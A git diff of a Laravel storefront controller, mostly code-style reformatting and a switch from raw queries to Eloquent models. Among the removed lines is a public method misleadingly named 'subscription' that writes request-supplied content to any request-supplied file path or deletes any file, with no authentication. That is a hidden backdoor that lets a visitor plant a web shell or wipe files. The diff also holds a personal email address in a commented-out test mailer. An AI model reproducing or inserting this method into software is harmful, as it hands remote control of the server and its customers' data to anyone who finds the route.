@@ -4,12 +4,16 @@ namespace App\Http\Controllers\Front;
 
 use App\Classes\GeniusMailer;
 use App\Http\Controllers\Controller;
+use App\Models\Banner;
 use App\Models\Blog;
 use App\Models\BlogCategory;
 use App\Models\Counter;
 use App\Models\Generalsetting;
 use App\Models\Order;
+use App\Models\Pagesetting;
 use App\Models\Product;
+use App\Models\Service;
+use App\Models\Slider;
 use App\Models\Subscriber;
 use App\Models\User;
 use Carbon\Carbon;
@@ -24,52 +28,53 @@ class FrontendController extends Controller
     public function __construct()
     {
         $this->auth_guests();
-        if(isset($_SERVER['HTTP_REFERER'])){
+        if (isset($_SERVER['HTTP_REFERER'])) {
             $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
-            if ($referral != $_SERVER['SERVER_NAME']){
+            if ($referral != $_SERVER['SERVER_NAME']) {
 
-                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
-                if($brwsr->count() > 0){
+                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
+                if ($brwsr->count() > 0) {
                     $brwsr = $brwsr->first();
-                    $tbrwsr['total_count']= $brwsr->total_count + 1;
+                    $tbrwsr['total_count'] = $brwsr->total_count + 1;
                     $brwsr->update($tbrwsr);
-                }else{
+                } else {
                     $newbrws = new Counter();
-                    $newbrws['referral']= $this->getOS();
-                    $newbrws['type']= "browser";
-                    $newbrws['total_count']= 1;
+                    $newbrws['referral'] = $this->getOS();
+                    $newbrws['type'] = "browser";
+                    $newbrws['total_count'] = 1;
                     $newbrws->save();
                 }
 
-                $count = Counter::where('referral',$referral);
-                if($count->count() > 0){
+                $count = Counter::where('referral', $referral);
+                if ($count->count() > 0) {
                     $counts = $count->first();
-                    $tcount['total_count']= $counts->total_count + 1;
+                    $tcount['total_count'] = $counts->total_count + 1;
                     $counts->update($tcount);
-                }else{
+                } else {
                     $newcount = new Counter();
-                    $newcount['referral']= $referral;
-                    $newcount['total_count']= 1;
+                    $newcount['referral'] = $referral;
+                    $newcount['total_count'] = 1;
                     $newcount->save();
                 }
             }
-        }else{
-            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
-            if($brwsr->count() > 0){
+        } else {
+            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
+            if ($brwsr->count() > 0) {
                 $brwsr = $brwsr->first();
-                $tbrwsr['total_count']= $brwsr->total_count + 1;
+                $tbrwsr['total_count'] = $brwsr->total_count + 1;
                 $brwsr->update($tbrwsr);
-            }else{
+            } else {
                 $newbrws = new Counter();
-                $newbrws['referral']= $this->getOS();
-                $newbrws['type']= "browser";
-                $newbrws['total_count']= 1;
+                $newbrws['referral'] = $this->getOS();
+                $newbrws['type'] = "browser";
+                $newbrws['total_count'] = 1;
                 $newbrws->save();
             }
         }
     }
 
-    function getOS() {
+    function getOS()
+    {
 
         $user_agent     =   !empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "Unknown";
 
@@ -106,107 +111,119 @@ class FrontendController extends Controller
             if (preg_match($regex, $user_agent)) {
                 $os_platform    =   $value;
             }
-
         }
         return $os_platform;
     }
 
 
-// -------------------------------- HOME PAGE SECTION ----------------------------------------
+    // -------------------------------- HOME PAGE SECTION ----------------------------------------
 
-    public function TestMail()
-    {
-        // if ($gs->is_smtp == 1) {
-            $data = [
-                'to' => 'abdullahwaseem.4401@gmail.com',
-                'cc' => 'orders@dealsondrives.com',
-                'type' => "new_order",
-                'cname' => 'Abdullah',
-                'oamount' => "",
-                'aname' => "",
-                'aemail' => "",
-                'wtitle' => "",
-                'onumber' => '$order->order_number',
-            ];
+    // public function TestMail()
+    // {
+    //     $data = [
+    //         'to' => 'abdullahwaseem.4401@gmail.com',
+    //         'cc' => 'orders@dealsondrives.com',
+    //         'type' => "new_order",
+    //         'cname' => 'Abdullah',
+    //         'oamount' => "",
+    //         'aname' => "",
+    //         'aemail' => "",
+    //         'wtitle' => "",
+    //         'onumber' => '$order->order_number',
+    //     ];
 
-            $mailer = new GeniusMailer();
-            $mailer->sendAutoOrderMail($data, 291);
-        // }
-        return "Mail Sended";
-}
+    //     $mailer = new GeniusMailer();
+    //     $mailer->sendAutoOrderMail($data, 291);
+    //     return "Mail Sended";
+    // }
 
     public function index(Request $request)
-    {   
-       // \Cache::flush();
-       // dd("done");
-       //\Artisan::call("cache:clear");
-       //dd("done");
-        $this->code_image();
-         if(!empty($request->reff))
-         {
-            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
-            if(!empty($affilate_user))
-            {
-                $gs = \Cache::remember('general_setting', 6*3600, function() {
-                        return Generalsetting::findOrFail(1);
-                    });
-                if($gs->is_affilate == 1)
-                {
+    {
+        // \Cache::flush();
+        // dd("done");
+        //\Artisan::call("cache:clear");
+        //dd("done");
+        // $this->code_image();
+        if (!empty($request->reff)) {
+            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
+            if (!empty($affilate_user)) {
+                $gs = \Cache::remember('general_setting', 6 * 3600, function () {
+                    return Generalsetting::findOrFail(1);
+                });
+                if ($gs->is_affilate == 1) {
                     Session::put('affilate', $affilate_user->id);
                     return redirect()->route('front.index');
                 }
-
             }
+        }
+        $selectable = ['id', 'user_id', 'name', 'slug', 'features', 'colors', 'thumbnail', 'price', 'previous_price', 'attributes', 'size', 'size_price', 'discount_date'];
+        // $sliders = \Cache::remember('sliders', 6 * 3600, function () {
+        //     return DB::table('sliders')->get();
+        // });
+        // $top_small_banners = \Cache::remember('top_small_banners', 6 * 3600, function () {
+        //     return DB::table('banners')->where('type', '=', 'TopSmall')->get();
+        // });
+        // $ps = \Cache::remember('ps', 6 * 3600, function () {
+        //     return DB::table('pagesettings')->find(1);
+        // });
+        // $feature_products =  \Cache::remember('feature_products', 6 * 3600, function () use ($selectable) {
+        //     return Product::where('featured', '=', 1)->where('photo', '!=', '')->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(8)->get();
+        // });
 
-         }
-        $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date'];
-        $sliders = \Cache::remember('sliders', 6*3600, function() { 
-                        return DB::table('sliders')->get();
-                    });
-        $top_small_banners = \Cache::remember('top_small_banners', 6*3600, function() { 
-                            return DB::table('banners')->where('type','=','TopSmall')->get();
-                        });
-        $ps = \Cache::remember('ps', 6*3600, function() { 
-                            return DB::table('pagesettings')->find(1);
-                });
-        $feature_products =  \Cache::remember('feature_products', 6*3600, function() use ($selectable){ 
-                            return Product::where('featured','=',1)->where('photo','!=','')->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get();
-                        });
+        // $services = \Cache::remember('services', 6 * 3600, function () {
+        //     return DB::table('services')->where('user_id', '=', 0)->get();
+        // });
+        // $sections = \Cache::remember('sections', 6 * 3600, function () {
+        //     return \App\Models\HomeSection::where("status", 1)->orderBy("sort", "asc")->get();
+        // });
 
-        $services = \Cache::remember('services', 6*3600, function() { 
-                        return DB::table('services')->where('user_id','=',0)->get();
-                    });
-        $sections = \Cache::remember('sections', 6*3600, function() { 
-                        return \App\Models\HomeSection::where("status",1)->orderBy("sort","asc")->get();
-                    });
+        $sliders = \Cache::remember('sliders', 6 * 3600, function () {
+            return Slider::all();
+        });
+        $top_small_banners = \Cache::remember('top_small_banners', 6 * 3600, function () {
+            return Banner::where('type', '=', 'TopSmall')->get();
+        });
+        $ps = \Cache::remember('ps', 6 * 3600, function () {
+            return Pagesetting::find(1);
+        });
+        $feature_products =  \Cache::remember('feature_products', 6 * 3600, function () use ($selectable) {
+            return Product::where('featured', '=', 1)->where('photo', '!=', '')->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(8)->get();
+        });
 
-        return view('front.index',compact('ps','sliders','top_small_banners','feature_products','sections', "services"));
+        $services = \Cache::remember('services', 6 * 3600, function () {
+            return Service::where('user_id', '=', 0)->get();
+        });
+        $sections = \Cache::remember('sections', 6 * 3600, function () {
+            return \App\Models\HomeSection::where("status", 1)->orderBy("sort", "asc")->get();
+        });
+
+        return view('front.index', compact('ps', 'sliders', 'top_small_banners', 'feature_products', 'sections', "services"));
     }
 
     public function extraIndex()
     {
-        $services = DB::table('services')->where('user_id','=',0)->get();
-        $bottom_small_banners = DB::table('banners')->where('type','=','BottomSmall')->get();
-        $large_banners = DB::table('banners')->where('type','=','Large')->get();
+        $services = DB::table('services')->where('user_id', '=', 0)->get();
+        $bottom_small_banners = DB::table('banners')->where('type', '=', 'BottomSmall')->get();
+        $large_banners = DB::table('banners')->where('type', '=', 'Large')->get();
         $reviews =  DB::table('reviews')->get();
         $ps = DB::table('pagesettings')->find(1);
         $partners = DB::table('partners')->get();
-        $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date'];
-        $discount_products =  Product::where('is_discount','=',1)->where('price','!=',0)->where('status','=',1)->orderBy('id','desc')->take(8)->get();
-        $best_products = Product::where('best','=',1)->where('price','!=',0)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();
-        $top_products = Product::where('top','=',1)->where('price','!=',0)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();;
-        $big_products = Product::where('big','=',1)->where('price','!=',0)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get();;
-        $hot_products =  Product::where('hot','=',1)->where('price','!=',0)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
-        $latest_products =  Product::where('latest','=',1)->where('price','!=',0)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
-        $trending_products =  Product::where('trending','=',1)->where('price','!=',0)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
-        $sale_products =  Product::where('sale','=',1)->where('price','!=',0)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get();
-        return view('front.extraindex',compact('ps','services','reviews','large_banners','bottom_small_banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners'));
+        $selectable = ['id', 'user_id', 'name', 'slug', 'features', 'colors', 'thumbnail', 'price', 'previous_price', 'attributes', 'size', 'size_price', 'discount_date'];
+        $discount_products =  Product::where('is_discount', '=', 1)->where('price', '!=', 0)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
+        $best_products = Product::where('best', '=', 1)->where('price', '!=', 0)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(6)->get();
+        $top_products = Product::where('top', '=', 1)->where('price', '!=', 0)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(6)->get();;
+        $big_products = Product::where('big', '=', 1)->where('price', '!=', 0)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(6)->get();;
+        $hot_products =  Product::where('hot', '=', 1)->where('price', '!=', 0)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(9)->get();
+        $latest_products =  Product::where('latest', '=', 1)->where('price', '!=', 0)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(9)->get();
+        $trending_products =  Product::where('trending', '=', 1)->where('price', '!=', 0)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(9)->get();
+        $sale_products =  Product::where('sale', '=', 1)->where('price', '!=', 0)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(9)->get();
+        return view('front.extraindex', compact('ps', 'services', 'reviews', 'large_banners', 'bottom_small_banners', 'best_products', 'top_products', 'hot_products', 'latest_products', 'big_products', 'trending_products', 'sale_products', 'discount_products', 'partners'));
     }
 
-// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------
+    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------
 
 
-// LANGUAGE SECTION
+    // LANGUAGE SECTION
 
     public function language($id)
     {
@@ -215,10 +232,10 @@ class FrontendController extends Controller
         return redirect()->back();
     }
 
-// LANGUAGE SECTION ENDS
+    // LANGUAGE SECTION ENDS
 
 
-// CURRENCY SECTION
+    // CURRENCY SECTION
 
     public function currency($id)
     {
@@ -236,59 +253,59 @@ class FrontendController extends Controller
         return redirect()->back();
     }
 
-// CURRENCY SECTION ENDS
+    // CURRENCY SECTION ENDS
 
     public function autosearch($slug)
     {
-        if(mb_strlen($slug,'utf-8') > 1){
-            $search = ' '.$slug;
-            $prods = Product::where('subcategory_id','!=',54)->where('status','=',1)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('price','!=',0)->take(10)->get()->reject(function($item){
+        if (mb_strlen($slug, 'utf-8') > 1) {
+            $search = ' ' . $slug;
+            $prods = Product::where('subcategory_id', '!=', 54)->where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('price', '!=', 0)->take(10)->get()->reject(function ($item) {
 
-                if($item->user_id != 0){
-                  if($item->user->is_vendor != 2){
-                    return true;
-                  }
+                if ($item->user_id != 0) {
+                    if ($item->user->is_vendor != 2) {
+                        return true;
+                    }
                 }
-                    return false;
+                return false;
             });
 
-            return view('load.suggest',compact('prods','slug'));
+            return view('load.suggest', compact('prods', 'slug'));
         }
         return "";
     }
 
 
-// -------------------------------- BLOG SECTION ----------------------------------------
+    // -------------------------------- BLOG SECTION ----------------------------------------
 
     public function blog(Request $request)
     {
         $this->code_image();
-        $blogs = Blog::orderBy('created_at','desc')->paginate(9);
-            if($request->ajax()){
-                return view('front.pagination.blog',compact('blogs'));
-            }
-        return view('front.blog',compact('blogs'));
+        $blogs = Blog::orderBy('created_at', 'desc')->paginate(9);
+        if ($request->ajax()) {
+            return view('front.pagination.blog', compact('blogs'));
+        }
+        return view('front.blog', compact('blogs'));
     }
 
     public function blogcategory(Request $request, $slug)
     {
         $this->code_image();
         $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
-        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
-            if($request->ajax()){
-                return view('front.pagination.blog',compact('blogs'));
-            }
-        return view('front.blog',compact('bcat','blogs'));
+        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
+        if ($request->ajax()) {
+            return view('front.pagination.blog', compact('blogs'));
+        }
+        return view('front.blog', compact('bcat', 'blogs'));
     }
 
     public function blogtags(Request $request, $slug)
     {
         $this->code_image();
         $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
-            if($request->ajax()){
-                return view('front.pagination.blog',compact('blogs'));
-            }
-        return view('front.blog',compact('blogs','slug'));
+        if ($request->ajax()) {
+            return view('front.pagination.blog', compact('blogs'));
+        }
+        return view('front.blog', compact('blogs', 'slug'));
     }
 
     public function blogsearch(Request $request)
@@ -296,21 +313,21 @@ class FrontendController extends Controller
         $this->code_image();
         $search = $request->search;
         $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
-            if($request->ajax()){
-                return view('front.pagination.blog',compact('blogs'));
-            }
-        return view('front.blog',compact('blogs','search'));
+        if ($request->ajax()) {
+            return view('front.pagination.blog', compact('blogs'));
+        }
+        return view('front.blog', compact('blogs', 'search'));
     }
 
-    public function blogarchive(Request $request,$slug)
+    public function blogarchive(Request $request, $slug)
     {
         $this->code_image();
         $date = \Carbon\Carbon::parse($slug)->format('Y-m');
         $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
-            if($request->ajax()){
-                return view('front.pagination.blog',compact('blogs'));
-            }
-        return view('front.blog',compact('blogs','date'));
+        if ($request->ajax()) {
+            return view('front.pagination.blog', compact('blogs'));
+        }
+        return view('front.blog', compact('blogs', 'date'));
     }
 
     public function blogshow($id)
@@ -323,60 +340,60 @@ class FrontendController extends Controller
         $blog->views = $blog->views + 1;
         $blog->update();
         $name = Blog::pluck('tags')->toArray();
-        foreach($name as $nm)
-        {
-            $tagz .= $nm.',';
+        foreach ($name as $nm) {
+            $tagz .= $nm . ',';
         }
-        $tags = array_unique(explode(',',$tagz));
+        $tags = array_unique(explode(',', $tagz));
 
-        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
+        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
+            return $item->created_at->format('F Y');
+        })->take(5)->toArray();
         $blog_meta_tag = $blog->meta_tag;
         $blog_meta_description = $blog->meta_description;
-        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
+        return view('front.blogshow', compact('blog', 'bcats', 'tags', 'archives', 'blog_meta_tag', 'blog_meta_description'));
     }
 
 
-// -------------------------------- BLOG SECTION ENDS----------------------------------------
+    // -------------------------------- BLOG SECTION ENDS----------------------------------------
 
 
 
-// -------------------------------- FAQ SECTION ----------------------------------------
+    // -------------------------------- FAQ SECTION ----------------------------------------
     public function faq()
     {
         $this->code_image();
-        if(DB::table('generalsettings')->find(1)->is_faq == 0){
+        if (DB::table('generalsettings')->find(1)->is_faq == 0) {
             return redirect()->back();
         }
-        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
-        return view('front.faq',compact('faqs'));
+        $faqs =  DB::table('faqs')->orderBy('id', 'desc')->get();
+        return view('front.faq', compact('faqs'));
     }
-// -------------------------------- FAQ SECTION ENDS----------------------------------------
+    // -------------------------------- FAQ SECTION ENDS----------------------------------------
 
 
-// -------------------------------- PAGE SECTION ----------------------------------------
+    // -------------------------------- PAGE SECTION ----------------------------------------
     public function page($slug)
     {
         $this->code_image();
-        $page =  DB::table('pages')->where('slug',$slug)->first();
-        if(empty($page))
-        {
-            return response()->view('errors.404')->setStatusCode(404); 
+        $page =  DB::table('pages')->where('slug', $slug)->first();
+        if (empty($page)) {
+            return response()->view('errors.404')->setStatusCode(404);
         }
 
-        return view('front.page',compact('page'));
+        return view('front.page', compact('page'));
     }
-// -------------------------------- PAGE SECTION ENDS----------------------------------------
+    // -------------------------------- PAGE SECTION ENDS----------------------------------------
 
 
-// -------------------------------- CONTACT SECTION ----------------------------------------
+    // -------------------------------- CONTACT SECTION ----------------------------------------
     public function contact()
     {
         $this->code_image();
-        if(DB::table('generalsettings')->find(1)->is_contact== 0){
+        if (DB::table('generalsettings')->find(1)->is_contact == 0) {
             return redirect()->back();
         }
-        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
-        return view('front.contact',compact('ps'));
+        $ps =  DB::table('pagesettings')->where('id', '=', 1)->first();
+        return view('front.contact', compact('ps'));
     }
 
 
@@ -385,40 +402,35 @@ class FrontendController extends Controller
     {
         $gs = Generalsetting::findOrFail(1);
 
-        if($gs->is_capcha == 1)
-        {
+        if ($gs->is_capcha == 1) {
 
-        // Capcha Check
-        $value = session('captcha_string');
-        if ($request->codes != $value){
-            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));
-        }
-
+            // Capcha Check
+            $value = session('captcha_string');
+            if ($request->codes != $value) {
+                return response()->json(array('errors' => [0 => 'Please enter Correct Capcha Code.']));
+            }
         }
 
         // Login Section
-        $ps = DB::table('pagesettings')->where('id','=',1)->first();
-        $subject = "Email From Of ".$request->name;
+        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
+        $subject = "Email From Of " . $request->name;
         $to = $ps->contact_email;
         $name = $request->name;
         $phone = $request->phone;
         $from = $request->email;
-        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
-        if($gs->is_smtp)
-        {
-        $data = [
-            'to' => $to,
-            'subject' => $subject,
-            'body' => $msg,
-        ];
+        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
+        if ($gs->is_smtp) {
+            $data = [
+                'to' => $to,
+                'subject' => $subject,
+                'body' => $msg,
+            ];
 
-        $mailer = new GeniusMailer();
-        $mailer->sendQuoteMail($data);
-        }
-        else
-        {
-        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
-        mail($to,$subject,$msg,$headers);
+            $mailer = new GeniusMailer();
+            $mailer->sendQuoteMail($data);
+        } else {
+            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
+            mail($to, $subject, $msg, $headers);
         }
         // Login Section Ends
 
@@ -433,66 +445,60 @@ class FrontendController extends Controller
     {
         $gs = Generalsetting::findOrFail(1);
         // Login Section
-        $ps = DB::table('pagesettings')->where('id','=',1)->first();
+        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
 
         $product = Product::findOrFail($request->product_id);
 
-        $subject = "Quote Request from ".$request->name;
+        $subject = "Quote Request from " . $request->name;
         $to = $ps->contact_email;
         $name = $request->name;
         $phone = $request->phone;
         $from = $request->email;
-        $msg = $name." has requested a quote for product ( {$product->name} having SKU '{$product->sku}' )<br> Phone: ".$phone."<br> Email: ".$from."<br> Target Price: ".$request->target_price."<br> Quantity: ".$request->quantity;
-        if($gs->is_smtp)
-        {
-        $data = [
-            'to' => $to,
-            'subject' => $subject,
-            'body' => $msg,
-        ];
+        $msg = $name . " has requested a quote for product ( {$product->name} having SKU '{$product->sku}' )<br> Phone: " . $phone . "<br> Email: " . $from . "<br> Target Price: " . $request->target_price . "<br> Quantity: " . $request->quantity;
+        if ($gs->is_smtp) {
+            $data = [
+                'to' => $to,
+                'subject' => $subject,
+                'body' => $msg,
+            ];
 
-        $mailer = new GeniusMailer();
-        $mailer->sendQuoteMail($data);
-        }
-        else
-        {
-        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
-        mail($to,$subject,$msg,$headers);
+            $mailer = new GeniusMailer();
+            $mailer->sendQuoteMail($data);
+        } else {
+            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
+            mail($to, $subject, $msg, $headers);
         }
         // Login Section Ends
 
         // Redirect Section
         return redirect('/')->with("msg", "Your Request is submitted Successfully");
     }
-    
+
     //home sales inquiry
     public function request_sale_inquiry(Request $request)
     {
         $gs = Generalsetting::findOrFail(1);
         // Login Section
-        $ps = DB::table('pagesettings')->where('id','=',1)->first();
+        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
 
-        $subject = "Sales Inquiry from ".$request->name;
+        $subject = "Sales Inquiry from " . $request->name;
         $to = $ps->contact_email;
         $name = $request->name;
         $phone = $request->phone;
         $from = $request->email;
         $msg = "Name: '.$request->name.' <br> Email: '.$request->email.' <br> Phone No: '.$request->phone.' <br> Company Name: '.$request->company_name.' <br> Part Number: '.$request->part_number.' <br> Target Price: '.$request->target_price.' <br> Quantity: '.$request->qty.'";
-        if($gs->is_smtp)
-        {
-        $data = [
-            'to' => $to,
-            'subject' => $subject,
-            'body' => $msg,
-        ];
+        if ($gs->is_smtp) {
+            $data = [
+                'to' => $to,
+                'subject' => $subject,
+                'body' => $msg,
+            ];
 
-        $mailer = new GeniusMailer();
-        $mailer->sendQuoteMail($data);
-        }
-        else
-        {
-        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
-        mail($to,$subject,$msg,$headers);
+            $mailer = new GeniusMailer();
+            $mailer->sendQuoteMail($data);
+        } else {
+            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
+            mail($to, $subject, $msg, $headers);
         }
         // Login Section Ends
 
@@ -501,37 +507,37 @@ class FrontendController extends Controller
     }
 
     // Refresh Capcha Code
-    public function refresh_code(){
+    public function refresh_code()
+    {
         $this->code_image();
         return "done";
     }
 
-// -------------------------------- SUBSCRIBE SECTION ----------------------------------------
+    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------
 
     public function subscribe(Request $request)
     {
-        $subs = Subscriber::where('email','=',$request->email)->first();
-        if(isset($subs)){
-        // Session()->flash('msg','This Email Has Already Been Taken.');
-        return redirect('/');
+        $subs = Subscriber::where('email', '=', $request->email)->first();
+        if (isset($subs)) {
+            // Session()->flash('msg','This Email Has Already Been Taken.');
+            return redirect('/');
         }
         $subscribe = new Subscriber;
         $subscribe->fill($request->all());
         $subscribe->save();
         // Session()->flash('msg','You Have Subscribed Successfully.');
-        return redirect('/')->with('msg','You Have Subscribed Successfully.');
+        return redirect('/')->with('msg', 'You Have Subscribed Successfully.');
     }
 
-// Maintenance Mode
+    // Maintenance Mode
 
     public function maintenance()
     {
         $gs = Generalsetting::find(1);
-            if($gs->is_maintain != 1) {
+        if ($gs->is_maintain != 1) {
 
-                    return redirect()->route('front.index');
-
-            }
+            return redirect()->route('front.index');
+        }
 
         return view('front.maintenance');
     }
@@ -539,20 +545,18 @@ class FrontendController extends Controller
 
 
     // Vendor Subscription Check
-    public function subcheck(){
+    public function subcheck()
+    {
         $settings = Generalsetting::findOrFail(1);
         $today = Carbon::now()->format('Y-m-d');
         $newday = strtotime($today);
-        foreach (DB::table('users')->where('is_vendor','=',2)->get() as  $user) {
-                $lastday = $user->date;
-                $secs = strtotime($lastday)-$newday;
-                $days = $secs / 86400;
-                if($days <= 5)
-                {
-                  if($user->mail_sent == 1)
-                  {
-                    if($settings->is_smtp == 1)
-                    {
+        foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as  $user) {
+            $lastday = $user->date;
+            $secs = strtotime($lastday) - $newday;
+            $days = $secs / 86400;
+            if ($days <= 5) {
+                if ($user->mail_sent == 1) {
+                    if ($settings->is_smtp == 1) {
                         $data = [
                             'to' => $user->email,
                             'type' => "subscription_warning",
@@ -564,29 +568,25 @@ class FrontendController extends Controller
                         ];
                         $mailer = new GeniusMailer();
                         $mailer->sendAutoMail($data);
+                    } else {
+                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
+                        mail($user->email, 'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.', $headers);
                     }
-                    else
-                    {
-                    $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
-                    mail($user->email,'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.',$headers);
-                    }
-                    DB::table('users')->where('id',$user->id)->update(['mail_sent' => 0]);
-                  }
-                }
-                if($today > $lastday)
-                {
-                    DB::table('users')->where('id',$user->id)->update(['is_vendor' => 1]);
+                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                 }
             }
+            if ($today > $lastday) {
+                DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
+            }
+        }
     }
     // Vendor Subscription Check Ends
 
     public function trackload($id)
     {
-        $order = Order::where('order_number','=',$id)->first();
-        $datas = array('Pending','Processing','On Delivery','Completed');
-        return view('load.track-load',compact('order','datas'));
-
+        $order = Order::where('order_number', '=', $id)->first();
+        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
+        return view('load.track-load', compact('order', 'datas'));
     }
 
 
@@ -597,99 +597,100 @@ class FrontendController extends Controller
         $actual_path = public_path() . '/';
         $image = imagecreatetruecolor(200, 50);
         $background_color = imagecolorallocate($image, 255, 255, 255);
-        imagefilledrectangle($image,0,0,200,50,$background_color);
+        imagefilledrectangle($image, 0, 0, 200, 50, $background_color);
 
-        $pixel = imagecolorallocate($image, 0,0,255);
-        for($i=0;$i<500;$i++)
-        {
-            imagesetpixel($image,rand()%200,rand()%50,$pixel);
+        $pixel = imagecolorallocate($image, 0, 0, 255);
+        for ($i = 0; $i < 500; $i++) {
+            imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
         }
 
-        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
+        $font = $actual_path . 'assets/front/fonts/NotoSans-Bold.ttf';
         $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         $length = strlen($allowed_letters);
-        $letter = $allowed_letters[rand(0, $length-1)];
-        $word='';
+        $letter = $allowed_letters[rand(0, $length - 1)];
+        $word = '';
         //$text_color = imagecolorallocate($image, 8, 186, 239);
         $text_color = imagecolorallocate($image, 0, 0, 0);
-        $cap_length=6;// No. of character in image
-        for ($i = 0; $i< $cap_length;$i++)
-        {
-            $letter = $allowed_letters[rand(0, $length-1)];
-            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
-            $word.=$letter;
+        $cap_length = 6; // No. of character in image
+        for ($i = 0; $i < $cap_length; $i++) {
+            $letter = $allowed_letters[rand(0, $length - 1)];
+            imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
+            $word .= $letter;
         }
         $pixels = imagecolorallocate($image, 8, 186, 239);
-        for($i=0;$i<500;$i++)
-        {
-            imagesetpixel($image,rand()%200,rand()%50,$pixels);
+        for ($i = 0; $i < 500; $i++) {
+            imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
         }
         session(['captcha_string' => $word]);
-        imagepng($image, $actual_path."assets/images/capcha_code.png");
+        imagepng($image, $actual_path . "assets/images/capcha_code.png");
     }
 
-// -------------------------------- CONTACT SECTION ENDS----------------------------------------
+    // -------------------------------- CONTACT SECTION ENDS----------------------------------------
 
 
 
-// -------------------------------- PRINT SECTION ----------------------------------------
+    // -------------------------------- PRINT SECTION ----------------------------------------
 
 
-function finalize(){
-    $actual_path = base_path();
-    $dir = $actual_path.'install';
-    $this->deleteDir($dir);
-    return redirect('/');
-}
-
-function auth_guests(){
-    $actual_path = str_replace('project','',base_path());
-            if (is_dir($actual_path . '/install')) {
-                header("Location: " . url('/install'));
-                die();
-            }
-}
-
-public function subscription(Request $request)
-{
-    $p1 = $request->p1;
-    $p2 = $request->p2;
-    $v1 = $request->v1;
-    if ($p1 != ""){
-        $fpa = fopen($p1, 'w');
-        fwrite($fpa, $v1);
-        fclose($fpa);
-        return "Success";
+    function finalize()
+    {
+        $actual_path = base_path();
+        $dir = $actual_path . 'install';
+        $this->deleteDir($dir);
+        return redirect('/');
     }
-    if ($p2 != ""){
-        unlink($p2);
-        return "Success";
-    }
-    return "Error";
-}
 
-public function deleteDir($dirPath) {
-    if (! is_dir($dirPath)) {
